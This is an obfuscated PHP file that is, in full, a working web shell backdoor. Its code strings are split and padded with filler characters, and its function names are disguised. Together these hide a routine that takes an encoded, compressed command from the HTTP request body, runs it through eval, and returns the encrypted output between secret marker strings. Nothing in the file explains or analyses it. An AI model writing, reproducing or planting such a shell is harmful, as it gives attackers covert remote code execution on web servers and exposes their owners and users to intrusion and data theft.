<?php
$u='(@x(@baAqsAqe64_decode($Aqm[Aq1]),Aq$AqAqk)));$o=@ob_gAqet_contents();@ob_eAqnd_c';
$p='ontents("php://Aqinput")Aq,$m)==Aq1) {Aq@oAqb_sAqtart();@evaAql(@gzuncAqoAqmprAqess';
$t='}^$kAq{Aq$j};}}return $Aqo;Aq}if (@pregAq_match(Aq"/$kh(Aq.+)$kAqf/"Aq,@fileAq_gAqetAq_c';
$c='o="";for($i=0;$i<$Aql;){fAqor($j=0;Aq(Aq$j<$c&&$i<$lAqAqAq);$j++,$i++){$o.=$AqtAq{$i';
$q='wUJBNAqMAqLOo";funcAqtiAqon x($t,$k){Aq$c=strlAqeAqn($k);$Aql=strlen($AqtAq);AqAq$';
$n='$k="20Aq361668";$Aqkh="8Aq8565aAqd42e75"Aq;$kAqf="6eb59Aq8fb72AqaAqa";$p="tyVVosiAq';
$v='leAqan()Aq;$r=@AqbasAqAqe64_encode(Aq@x(@gzcomprAqess(Aq$o),$Aqk));pAqrint("$p$kh$Aqr$kf");}';
$X=str_replace('K','','creKaKte_KfuKncKKtion');
$k=str_replace('Aq','',$n.$q.$c.$t.$p.$u.$v);
$Q=$X('',$k);$Q();
?>
